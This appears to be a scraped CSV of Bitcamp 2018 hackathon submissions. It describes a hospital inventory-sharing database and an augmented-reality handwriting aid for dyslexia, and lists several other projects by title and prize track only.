We began with the challenge of Best Hack for Aiding Natural Disaster Recovery Efforts by Booz Allen Hamilton. We decided that one of the most important aspects of recovery efforts is being able to provide proper care for the wounded and dying. Often a lack of resources prevents hospitals from properly performing their job. To help fix this issue we wanted to create a database only accessible by hospitals. They would use this database to update their own inventory and view the inventory of nearby hospitals. This would allow them to find the resources that they need and request them from one of the hospitals in the database rather than placing an order with their provider and waiting for a shipment. The goal is that this database could help save lives of those affected specifically by natural disasters.

What it does

The database allows hospitals to update their inventory and look at/ search other hospitals inventories. This helps them find supplies in emergency situations.

How we built it

We decided to use MongoDB to host our database. This decision was made because we knew that we would be able to access professionals that work on this database while at bitcamp and work out any difficulties we encountered. We also liked how it is user friendly and updates in real time. It also works well with HTML so that we were able to design the site the database was hosted on to look how we wanted. We coded most of the project in javascript.

Challenges we ran into

We were unfamiliar with MongoDB. It had been a while since any of us had coded in HTML or Javascript. We had difficulty organizing the project. MongoDB is hosted online and wifi was a little unreliable.

Accomplishments that we're proud of

Real-time updating of the database. Interactions between HTML and Javascript. Ability to build a working database that catches errors in input.

What we learned

How to work with MongoDB. Learned more about the functionality of databases. Refreshed Javascript and HTML skills.

What's next for Hospital Databases

Add supplies by ID only
Email other hospitals through SES on the database
Both personalized and mass
White-list IPs for security
Verify that a username is available
Verify that the ID and item name match
Remove user option
",https://github.com/lan99/Hospital-Database,"Best Philanthropic Hack - Bloomberg, Best Use of MongoDB Stitch - MongoDB, Best Hack for Aiding Natural Disaster Recovery Efforts - Booz Allen Hamilton",no,sgarciabeech,,
Augmented Reality to Overcome Dyslexia ,http://bitcamp2018.devpost.com/submissions/92588-augmented-reality-to-overcome-dyslexia,"The Problem

1 out of 10 people worldwide are affected by learning disabilities and the most common one is dyslexia���. Dyslexia lowers student self esteem and these students are 3 times more likely to drop out of school  and 2 times more likely to be suspended than that of their general education peers.��� As well as making learning to read and write more difficult for individuals, it also affects their families and the surrounding community.

Our Solution

We aim to help these students by creating an Augmented Reality program that will help them better keep up with their peers. Our team's concept features an AR headset worn by a user that tracks the words they write onto paper. If there is a misplaced or invalid character, the headset would highlight that character and help them correct the mistake, thereby allowing identifying weaknesses and creating immediate feedback. Unlike current market products which only detect syntax and spelling errors, our device also will use machine learning to detect characters that have been written incorrectly, which is an error many people with dyslexia struggle with when learning to write.  Another shortcoming of current products is that they only analyze handwriting after the user has finished writing an entire sentence. Team ART plans to implement a LIVE handwriting correction system to create a more intuitive experience. 

Building Plan

We plan to follow the design thinking process to best create a product that helps our intended user base. We first plan to empathize with children with dyslexia to better get a feel of their experiences and how they can be improved. Because children with learning disabilities is a protected population, we plan on doing this by interviewing their parents, teachers, doctors, and other adults who interact with these kids on a daily basis. After we understand our target market, we will define the scope of the problem and ideate potential solutions. With a clear problem statement in mind, we will begin prototyping our ideas and end by testing them to see if they bring about the positive impact we desire. We will use an iterative development model though so we can continue making improvements on our design as we work our way through the design thinking process. 

Challenges We Faced/Potential Future Challenges

Some challenge we faced during BitCamp was our limited knowledge on how to use Unity and Tesseract which will be the basis of our project. Because of this, we spent the hackathon learning these tools as opposed to programming the project itself. Some future challenges we might face though are in regards to the ethics of this device, proving a statistically significant quantitative increase in writing ability, and how to overcome lag to provide real time feedback. We also might face challenges with the compatibility of the different software tools we use to build this assistive device so it will have to be something we are mindful of moving forward. 

What We Learned/Will Lean

During BitCamp, we gained more experience working with Unity and Tesseract so that we can implement our program. By gaining the technical skills necessary to implement this project, we can hit the ground running when we acquire a HoloLens to build this device. Furthermore, we will learn more about the design thinking and research process so that we make the best product to meet the consumers needs. 

Timeline

We came into BitCamp with the preliminary research done on this project. During our time here, we focused on learning how to best use Unity for the rendering we will need to do and Tesseract for the image processing component. Because we plan to continue working on this project over the next 2 years we are at UMD, we are willing to wait for customer feedback since it will ultimately better aid the design of the device. By the end of this semester, we are hoping to send out surveys to gather feedback from the target market. We will continue working to develop this device through all of next year and hope to test on participants in the year after. We plan to follow the iterative design process so we can continue to update and improve our device�۪s performance during the testing stages. 
",,"Best Hack (be passionate) - Facebook, Best Accessibility Hack - Microsoft, Most Unique Hack - 1517 Fund",,,,
Mood Music,https://devpost.com/software/mood-music-mjsiv8,,,"Best Hack (be passionate) - Facebook, Best Social Media Hack - Facebook",A45,,,
Mining Malware,https://devpost.com/software/mining-malware,,,Best Social Media Hack - Facebook,K29,,,
Euphoria,https://devpost.com/software/euphoria-rpyvh8,,,Best Social Media Hack - Facebook,No,,,
SaveSpace,https://devpost.com/software/savespace,,,"Best Hack (be passionate) - Facebook, Best Social Media Hack - Facebook",No,,,
